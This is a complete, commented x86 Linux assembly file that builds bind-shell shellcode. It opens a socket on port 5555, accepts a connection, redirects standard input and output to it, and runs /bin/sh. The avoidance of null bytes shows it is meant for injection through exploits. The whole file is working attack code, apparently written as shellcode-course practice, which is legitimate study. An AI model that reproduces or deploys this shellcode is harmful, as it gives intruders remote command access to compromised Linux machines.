; Filename: shell_bind_tcp.nasm
; Purpose: creating a bind tcp shellcode

section .text

global  _start

_start:

	xor eax, eax	; clear eax
	xor ebx, ebx	; clear ebx
	xor edx, edx	; clear edx

; int socketcall (int call, unsigned long *args)
; sockfd = socket(int socket_family, int socket_type, int protocol)
; sockfd = socket(2,1,0)

	push eax	; third arg to socket (protocol): 0
	push byte 0x1	; second arg to socket (socket_type): 1
	push byte 0x2	; first arg to socket (socket_family): 2

; int socketcall(int call, unsigned long *args);

	mov ecx, esp	; set add of array as 2nd arg to socketcall
	inc bl  	; set first arg of socketcall to #1 (SYS_SOCKET)

	mov al, 102	; 102= sys_socketcall: call socketcall #1: SYS_SOCKET 
			; using al instead of eax avoids nulls(0x00)	

	int 0x80 	; jump into kernel mode , execute the sys_socketcall-> socket

	mov esi, eax	; store the return value (eax) into sockfd (esi)
 
; ----------------------------------------------

; eax = fd , ebx = 1 , esi = fd 
; int socketcall(int call, unsigned long *args)
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
; bind(sockfd, &sockaddr, 16)

; prepare struct_sockaddr for bind: 

	push edx	 ; sin_addr: 0.0.0.0
	push word 0xB315 ; sin_port: 5555
	
	inc bl		; set first arg of socketcall to #2 (SYS_BIND)
	push bx		; sin_family: 0x2
		
	mov ecx, esp	; save addr struct to ecx

; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	push byte 16	; addrlen: length of struct_sockaddr = 16
	push ecx	; pointer to struct_sockaddr
	push esi	; file descriptor's socket of previous call (fd)

; int socketcall(int call, unsigned long *args)

	mov ecx, esp	; set add of array as 2nd arg to socketcall
			; ebx =2 the first arg of socketcall is #2 (SYS_BIND)

	mov al, 102	; 102= sys_socketcall: call socketcall #2: SYS_BIND 
			; using al instead of eax avoids nulls(0x00)	
	
	int 0x80 	; jump into kernel mode , execute sys_socketcall-> bind
	
; ----------------------------------------------

; int socketcall(int call, unsigned long *args)
; int listen(int sockfd, int backlog)
; listen(sockfd, 0)

	push edx	; backlog = 0
	push esi	; file descriptor's socket of previous call (fd)

; int socketcall(int call, unsigned long *args)

	mov ecx, esp	; set add of array as 2nd arg to socketcall
	mov bl, 0x4	; set first arg of socketcall to #4 (SYS_LISTEN)

	mov al, 102	; 102= sys_socketcall: call socketcall #4: SYS_LISTEN 	
			; using al instead of eax avoids nulls(0x00)	

	int 0x80 	; jump into kernel mode , execute sys_socketcall-> listen

	
; ----------------------------------------------

; int socketcall(int call, unsigned long *args)
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
; client = accept(sockfd, 0, 0)

	push edx	; addrlen = 0
	push edx	; addr = 0
	push esi	; file descriptor's socket of previous call (fd)

; int socketcall(int call, unsigned long *args)

	mov ecx, esp	; set add of array as 2nd arg to socketcall
	inc bl		; set first arg of socketcall to #5 (SYS_ACCEPT)

	mov al, 102	; 102= sys_socketcall: call socketcall #5: SYS_ACCEPT 
			; using al instead of eax avoids nulls(0x00)	

	int 0x80 	; jump into kernel mode , execute sys_socketcall-> accept


; ----------------------------------------------

; int dup2(int oldfd, int newfd)
; dup2(client, 0)

; use loop to create three filedescriptors STDIN=0, STDOUT=1, STDERR=2

	mov ebx, eax	; save file descriptor's client socket
	xor ecx, ecx	; clear ecx
	mov cl, 2	; initilize counter ecx to 2 

loop:
	mov al, 0x3f 	; Set eax to 63 (syscall number for dup2)
	int 0x80 	; jump into kernel mode , execute syscall dup2

	dec ecx		; Decrement ecx (newfd)
	jns loop	; jump to loop until ecx is less than 0

; ----------------------------------------------	


; int execve(const char *filename, char *const argv[], char *const envp[])
; filename = /bin/sh
; argv = arguments  (address if /bin/sh == filename)
; envp << can be null

	push edx	; push 0 on stack (null terminator)
		
; push //bin/sh (8 bytes)

	push 0x68732f2f		; hs//
	push 0x6e69622f		; nib/

	mov ebx, esp
	push edx	
	push ebx	
	mov ecx, esp

	mov al, 0x0b	; Set eax to 11 (syscall number for execve)
	int 0x80 	; jump into kernel mode , execute syscall execve

